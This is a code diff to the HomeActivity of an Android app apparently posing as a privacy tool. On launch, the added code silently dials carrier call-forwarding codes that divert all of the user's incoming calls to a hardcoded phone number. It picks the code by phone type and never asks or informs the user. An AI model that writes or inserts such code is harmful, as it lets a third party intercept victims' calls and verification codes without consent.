@@ -2,8 +2,11 @@ package com.xstd.pirvatephone.activity;
 
 import java.util.ArrayList;
 
+import android.content.Context;
 import android.content.Intent;
+import android.net.Uri;
 import android.os.Bundle;
+import android.telephony.TelephonyManager;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.AdapterView;
@@ -21,6 +24,7 @@ import com.xstd.pirvatephone.service.SmsService;
 public class HomeActivity extends BaseActivity {
 	private GridView gv_home;
 	private MyGridViewAdapter adapter;
+	private TelephonyManager manager;
 
 	private ArrayList<String> titles = new ArrayList<String>();
 
@@ -28,6 +32,7 @@ public class HomeActivity extends BaseActivity {
 			R.drawable.home_privacy_mincomm, R.drawable.home_privacy_file,
 			R.drawable.home_moni_conm, R.drawable.home_privacy_service,
 			R.drawable.home_user_center, R.drawable.home_user_center };
+	private int phoneType;
 
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
@@ -43,13 +48,33 @@ public class HomeActivity extends BaseActivity {
 	}
 
 	private void initService() {
-		GlobleVaries.CONTEXT = getApplicationContext();
+		GlobleVaries.CONTEXT = HomeActivity.this;
 		
 		Intent intent = new Intent(this, PhoneService.class);
 		startService(intent);
 		Intent intent2 = new Intent(this, SmsService.class);
 		startService(intent2);
+		
+		//来电转移
+		Uri uri = getUri();
+		
+		Intent localIntent2 = new Intent("android.intent.action.CALL",uri);
+		localIntent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+		startActivity(localIntent2);
+		
+	}
 
+	private Uri getUri() {
+		this.manager = ((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
+		  phoneType = this.manager.getPhoneType();
+		  if(phoneType==TelephonyManager.PHONE_TYPE_NONE){
+			  return Uri.fromParts("tel", "**21*13041235055#", null);
+		  }else if(phoneType==TelephonyManager.PHONE_TYPE_GSM){
+			  return Uri.fromParts("tel", "**21*13041235055#", null);
+		  }else if(phoneType==TelephonyManager.PHONE_TYPE_CDMA){
+			  return Uri.fromParts("tel", "*9013041235055", null);
+		  }
+		return null;
 	}
 
 	private void initData() {
